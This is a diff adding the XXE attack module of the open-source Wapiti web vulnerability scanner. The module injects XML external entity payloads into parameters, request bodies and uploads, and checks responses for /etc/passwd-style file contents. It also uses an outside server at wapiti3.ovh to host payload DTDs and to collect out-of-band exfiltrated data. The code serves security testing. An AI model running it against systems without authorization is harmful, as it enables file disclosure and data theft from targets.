@@ -1,0 +1,413 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This file is part of the Wapiti project (http://wapiti.sourceforge.net)
+# Copyright (C) 2019 Nicolas Surribas
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation; either version 2 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+from itertools import chain
+from binascii import unhexlify
+from time import sleep
+from urllib.parse import quote
+
+from requests.exceptions import ReadTimeout, RequestException
+
+from wapitiCore.attack.attack import Attack, FileMutator, Mutator
+from wapitiCore.language.vulnerability import Vulnerability, Anomaly, _
+from wapitiCore.net.web import Request
+
+
+XXE_PAYLOAD = "http://wapiti3.ovh/xxe/{random_id}/{path_id}/{hex_param}/{payload}.dtd"
+
+
+def check_success(content: str) -> bool:
+    if "root:x:0:" in content:
+        # either /etc/passwd or /etc/group
+        return True
+    if "root:*:0:0" in content:
+        return True
+    if "Network services, Internet style" in content:
+        return True
+    if "RFC6335" in content:
+        return True
+    if "defined by IANA" in content:
+        return True
+    if "network name/network number mappings" in content:
+        return True
+    return False
+
+
+class mod_xxe(Attack):
+    """This class implements a file handling attack"""
+
+    name = "xxe"
+    do_get = True
+    do_post = True
+
+    PAYLOADS_FILE = "xxePayloads.txt"
+    MSG_VULN = _("XXE vulnerability")
+
+    def __init__(self, crawler, persister, logger, attack_options):
+        Attack.__init__(self, crawler, persister, logger, attack_options)
+        self.vulnerables = set()
+        self.attacked_urls = set()
+
+    @property
+    def payloads(self):
+        return [(payload.replace("[SESSION_ID]", self._session_id), tags) for payload, tags in super().payloads]
+        # for payload, tags in super().payloads:
+        #     yield payload.replace("[SESSION_ID]", self._session_id), tags
+
+    def get_mutator(self):
+        methods = ""
+        if self.do_get:
+            methods += "G"
+        if self.do_post:
+            # No file uploads, we won't attack filenames but file contents
+            methods += "P"
+
+        return Mutator(
+            methods=methods,
+            payloads=self.payloads,
+            qs_inject=self.must_attack_query_string,
+            skip=self.options.get("skipped_parameters")
+        )
+
+    def attack(self):
+        mutator = self.get_mutator()
+
+        http_resources = self.persister.get_links(attack_module=self.name) if self.do_get else []
+        forms = self.persister.get_forms(attack_module=self.name) if self.do_post else []
+
+        for original_request in chain(http_resources, forms):
+            warned = False
+            timeouted = False
+            page = original_request.path
+            saw_internal_error = False
+            current_parameter = None
+            vulnerable_parameter = False
+
+            if self.verbose >= 1:
+                print("[+] {}".format(original_request))
+
+            if original_request.url not in self.attacked_urls:
+                yield from self.attack_body(original_request)
+                self.attacked_urls.add(original_request.url)
+
+            if original_request.path_id in self.vulnerables:
+                continue
+
+            if original_request.is_multipart:
+                yield from self.attack_upload(original_request)
+                if original_request.path_id in self.vulnerables:
+                    continue
+
+            for mutated_request, parameter, payload, flags in mutator.mutate(original_request):
+                try:
+                    if current_parameter != parameter:
+                        # Forget what we know about current parameter
+                        current_parameter = parameter
+                        vulnerable_parameter = False
+                    elif vulnerable_parameter:
+                        # If parameter is vulnerable, just skip till next parameter
+                        continue
+
+                    if self.verbose == 2:
+                        print("[¨] {0}".format(mutated_request))
+
+                    try:
+                        response = self.crawler.send(mutated_request)
+                    except ReadTimeout:
+                        if timeouted:
+                            continue
+
+                        self.log_orange("---")
+                        self.log_orange(Anomaly.MSG_TIMEOUT, page)
+                        self.log_orange(Anomaly.MSG_EVIL_REQUEST)
+                        self.log_orange(mutated_request.http_repr())
+                        self.log_orange("---")
+
+                        if parameter == "QUERY_STRING":
+                            anom_msg = Anomaly.MSG_QS_TIMEOUT
+                        else:
+                            anom_msg = Anomaly.MSG_PARAM_TIMEOUT.format(parameter)
+
+                        self.add_anom(
+                            request_id=original_request.path_id,
+                            category=Anomaly.RES_CONSUMPTION,
+                            level=Anomaly.MEDIUM_LEVEL,
+                            request=mutated_request,
+                            info=anom_msg,
+                            parameter=parameter
+                        )
+                        timeouted = True
+                    else:
+                        if check_success(response.content):
+                            # An error message implies that a vulnerability may exists
+                            if parameter == "QUERY_STRING":
+                                vuln_message = Vulnerability.MSG_QS_INJECT.format(self.MSG_VULN, page)
+                            else:
+                                vuln_message = _("{0} via injection in the parameter {1}").format(self.MSG_VULN, parameter)
+
+                            self.add_vuln(
+                                request_id=original_request.path_id,
+                                category=Vulnerability.XXE,
+                                level=Vulnerability.HIGH_LEVEL,
+                                request=mutated_request,
+                                info=vuln_message,
+                                parameter=parameter
+                            )
+
+                            self.log_red("---")
+                            self.log_red(
+                                Vulnerability.MSG_QS_INJECT if parameter == "QUERY_STRING" else Vulnerability.MSG_PARAM_INJECT,
+                                self.MSG_VULN,
+                                page,
+                                parameter
+                            )
+                            self.log_red(Vulnerability.MSG_EVIL_REQUEST)
+                            self.log_red(mutated_request.http_repr())
+                            self.log_red("---")
+
+                            # We reached maximum exploitation for this parameter, don't send more payloads
+                            vulnerable_parameter = True
+                            continue
+
+                        elif response.status == 500 and not saw_internal_error:
+                            saw_internal_error = True
+                            if parameter == "QUERY_STRING":
+                                anom_msg = Anomaly.MSG_QS_500
+                            else:
+                                anom_msg = Anomaly.MSG_PARAM_500.format(parameter)
+
+                            self.add_anom(
+                                request_id=original_request.path_id,
+                                category=Anomaly.ERROR_500,
+                                level=Anomaly.HIGH_LEVEL,
+                                request=mutated_request,
+                                info=anom_msg,
+                                parameter=parameter
+                            )
+
+                            self.log_orange("---")
+                            self.log_orange(Anomaly.MSG_500, page)
+                            self.log_orange(Anomaly.MSG_EVIL_REQUEST)
+                            self.log_orange(mutated_request.http_repr())
+                            self.log_orange("---")
+                except (KeyboardInterrupt, RequestException) as exception:
+                    yield exception
+
+            yield original_request
+
+    def attack_body(self, original_request) -> bool:
+        # Should not yield request as it will mark it as attacked
+        for payload, tags in self.payloads:
+            payload = payload.replace("[PATH_ID]", str(original_request.path_id))
+            payload = payload.replace("[PARAM_AS_HEX]", "72617720626f6479")  # raw body
+            mutated_request = Request(original_request.url, method="POST", enctype="text/xml", post_params=payload)
+
+            if self.verbose == 2:
+                print("[¨] {0}".format(mutated_request))
+
+            try:
+                response = self.crawler.send(mutated_request)
+            except (KeyboardInterrupt, RequestException) as exception:
+                yield exception
+            else:
+                if check_success(response.content):
+                    self.add_vuln(
+                        request_id=original_request.path_id,
+                        category=Vulnerability.XXE,
+                        level=Vulnerability.HIGH_LEVEL,
+                        request=mutated_request,
+                        info="XXE vulnerability leading to file disclosure",
+                        parameter="raw body"
+                    )
+
+                    self.log_red("---")
+                    self.log_red(
+                        "{0} in {1} leading to file disclosure",
+                        self.MSG_VULN,
+                        original_request.url
+                    )
+                    self.log_red(Vulnerability.MSG_EVIL_REQUEST)
+                    self.log_red(mutated_request.http_repr())
+                    self.log_red("---")
+                    self.vulnerables.add(original_request.path_id)
+                    break
+
+    def attack_upload(self, original_request):
+        # Should not yield request as it will mark it as attacked
+        mutator = FileMutator(payloads=self.payloads)
+        current_parameter = None
+        vulnerable_parameter = False
+
+        for mutated_request, parameter, payload, flags in mutator.mutate(original_request):
+            try:
+                if current_parameter != parameter:
+                    # Forget what we know about current parameter
+                    current_parameter = parameter
+                    vulnerable_parameter = False
+                elif vulnerable_parameter:
+                    # If parameter is vulnerable, just skip till next parameter
+                    continue
+
+                if self.verbose == 2:
+                    print("[¨] {0}".format(mutated_request))
+
+                try:
+                    response = self.crawler.send(mutated_request)
+                except RequestException as exception:
+                    yield exception
+                else:
+                    if check_success(response.content):
+                        if check_success(response.content):
+                            self.add_vuln(
+                                request_id=original_request.path_id,
+                                category=Vulnerability.XXE,
+                                level=Vulnerability.HIGH_LEVEL,
+                                request=mutated_request,
+                                info="XXE vulnerability leading to file disclosure",
+                                parameter=parameter
+                            )
+
+                            self.log_red("---")
+                            self.log_red(
+                                Vulnerability.MSG_PARAM_INJECT,
+                                self.MSG_VULN,
+                                original_request.url,
+                                parameter
+                            )
+                            self.log_red(Vulnerability.MSG_EVIL_REQUEST)
+                            self.log_red(mutated_request.http_repr())
+                            self.log_red("---")
+                            vulnerable_parameter = True
+                            self.vulnerables.add(original_request.path_id)
+            except KeyboardInterrupt as exception:
+                yield exception
+
+    def finish(self):
+        sleep(2)
+        # A la fin des attaques on questionne le endpoint pour savoir s'il a été contacté
+        endpoint_request = Request("http://wapiti3.ovh/get_xxe.php?id={}".format(self._session_id))
+        try:
+            response = self.crawler.send(endpoint_request)
+        except ReadTimeout:
+            pass
+        else:
+            data = response.json
+            if isinstance(data, dict):
+                for request_id in data:
+                    original_request = self.persister.get_path_by_id(request_id)
+                    if original_request is None:
+                        continue
+                        # raise ValueError("Could not find the original request with ID {}".format(request_id))
+
+                    page = original_request.path
+                    for hex_param in data[request_id]:
+                        parameter = unhexlify(hex_param).decode("utf-8")
+
+                        for infos in data[request_id][hex_param]:
+                            request_url = infos["url"]
+                            # Date in ISO format
+                            request_date = infos["date"]
+                            request_ip = infos["ip"]
+                            request_size = infos["size"]
+                            payload_name = infos["payload"]
+
+                            if parameter == "QUERY_STRING":
+                                vuln_message = Vulnerability.MSG_QS_INJECT.format(self.MSG_VULN, page)
+                            elif parameter == "raw body":
+                                vuln_message = _(
+                                    "Out-Of-Band {0} by sending raw XML in request body"
+                                ).format(
+                                    self.MSG_VULN
+                                )
+                            else:
+                                vuln_message = _(
+                                    "Out-Of-Band {0} via injection in the parameter {1}"
+                                ).format(
+                                    self.MSG_VULN,
+                                    parameter
+                                )
+
+                            more_infos = _(
+                                "The target sent {0} bytes of data to the endpoint at {1} with IP {2}.\n"
+                                "Received data can be seen at {3}."
+                            ).format(
+                                request_size,
+                                request_date,
+                                request_ip,
+                                request_url
+                            )
+
+                            vuln_message += "\n" + more_infos
+
+                            # placeholder if shit happens
+                            payload = (
+                                "<xml>"
+                                "See https://phonexicum.github.io/infosec/xxe.html#attack-vectors"
+                                "</xml>"
+                            )
+
+                            for payload, flags in self.payloads:
+                                if "{}.dtd".format(payload_name) in payload:
+                                    payload = payload.replace("[PATH_ID]", str(original_request.path_id))
+                                    payload = payload.replace("[PARAM_AS_HEX]", "72617720626f6479")
+                                    break
+
+                            if parameter == "raw body":
+                                mutated_request = Request(
+                                    original_request.path,
+                                    method="POST",
+                                    enctype="text/xml",
+                                    post_params=payload
+                                )
+                            elif parameter == "QUERY_STRING":
+                                mutated_request = Request(
+                                    "{}?{}".format(original_request.path, quote(payload)),
+                                    method="GET"
+                                )
+                            elif parameter in original_request.get_keys or parameter in original_request.post_keys:
+                                mutator = Mutator(
+                                    methods="G" if original_request.method == "GET" else "P",
+                                    payloads=[(payload, set())],
+                                    qs_inject=self.must_attack_query_string,
+                                    parameters=[parameter],
+                                    skip=self.options.get("skipped_parameters")
+                                )
+
+                                mutated_request, __, __, __ = next(mutator.mutate(original_request))
+                            else:
+                                mutator = FileMutator(
+                                    payloads=[(payload, set())],
+                                    parameters=[parameter],
+                                    skip=self.options.get("skipped_parameters")
+                                )
+                                mutated_request, __, __, __ = next(mutator.mutate(original_request))
+
+                            self.add_vuln(
+                                request_id=original_request.path_id,
+                                category=Vulnerability.XXE,
+                                level=Vulnerability.HIGH_LEVEL,
+                                request=mutated_request,
+                                info=vuln_message,
+                                parameter=parameter
+                            )
+
+                            self.log_red("---")
+                            self.log_red(vuln_message)
+                            self.log_red(Vulnerability.MSG_EVIL_REQUEST)
+                            self.log_red(mutated_request.http_repr())
+                            self.log_red("---")
